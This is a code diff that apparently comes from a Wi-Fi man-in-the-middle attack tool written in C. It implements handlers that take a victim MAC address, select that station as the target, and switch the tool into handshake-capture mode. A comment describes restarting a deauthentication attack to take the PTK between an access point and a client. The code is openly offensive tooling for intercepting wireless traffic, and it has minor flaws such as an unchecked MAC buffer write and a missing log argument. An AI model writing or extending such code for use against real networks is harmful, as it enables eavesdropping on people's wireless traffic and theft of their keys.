@@ -127,9 +127,62 @@ void mitm_get_dictionary_reply_action(void *action_data, void *usr_data, char *o
 
 }
 
-void mitm_set_victim_request_action (void *action_data, void *usr_data, char *options){}
+void mitm_set_victim_request_action (void *action_data, void *usr_data, char *options){
+	struct mitm_recv_info *recv_info = (struct mitm_recv_info *) action_data;
+	struct MITM *MITM = (struct MITM*) usr_data;
+	struct victim_info target;
+	struct victim_info *tmp;
+	int match = 0, ret;
+	char buf[256];
+	memset(report, 0, BUFFER_LEN);
+	options = strchr(options, '?');
+	if (options) {
+		if (find_info_tag(buf, sizeof(buf), "MAC", options)) {
+			int offset = 0;
+			for (char *mac = strtok(buf, ":"); mac; mac = strtok(NULL, ":")) {
+				target.mac[offset++] = strtol(mac, NULL, 16);
+			}
+		}
+	}
+	dl_list_for_each(tmp, &MITM->victim_list, struct victim_info, victim_node) {
+		if (!memcmp(target.mac, tmp->mac, ETH_ALEN)) {
+			match = 1;
+			memcpy(MITM->encry_info.SA, target.mac, ETH_ALEN);
+			// Start deauth attack again to take the PTK between specify AP and STA.
+			MITM->state = MITM_state_capture_handshake;
+			// Send postive reply.
+		}
+	}
+	sprintf(report, "%s:%s,"MACSTR, MITM_SET_VICTIM_REPLY, 
+					match? MITM_COMMAND_OK : MITM_COMMAND_NOT_FOUND, MAC2STR(target.mac));
+	ret = sendto(recv_info->sock_fd, report, strlen(report), recv_info->send_flags,
+				(const struct sockaddr *)&recv_info->recv_from, recv_info->length);
+	if (ret < 0) {
+		log_printf(MSG_WARNING, "[%s]Send %s to client failed, with error:%s",
+										__func__, match ? MITM_COMMAND_OK : MITM_COMMAND_NOT_FOUND, strerror(errno));
+	}
+	return;
+}
 
-void mitm_set_victim_reply_action (void *action_data, void *usr_data, char *options){}
+void mitm_set_victim_reply_action (void *action_data, void *usr_data, char *options){
+	char *head, *mac;
+	head = strchr(options, ':');
+	mac = strchr(options, ',');
+	if (!head || !mac) {
+		log_printf(MSG_WARNING, "[%s]Wrong reply format.");
+		return;
+	}
+	head++;
+	mac++;
+	if (!strncmp(head, MITM_COMMAND_OK, strlen(MITM_COMMAND_OK))) {
+		log_printf(MSG_INFO, "Accept Victim: "YELLOW"%s "NONE", taking PTK...", mac);
+	} else if (!strncmp(head, MITM_COMMAND_NOT_FOUND, strlen(MITM_COMMAND_NOT_FOUND))) {
+		log_printf(MSG_INFO, "Specify Victim: "YELLOW"%s "NONE"not found.", mac);
+	} else {
+		log_printf(MSG_INFO, "Unknow reply.");
+	}
+	return;
+}
 
 void mitm_get_victim_request_action (void *action_data, void *usr_data, char *options) {
   struct mitm_recv_info *recv_info = (struct mitm_recv_info *) action_data;
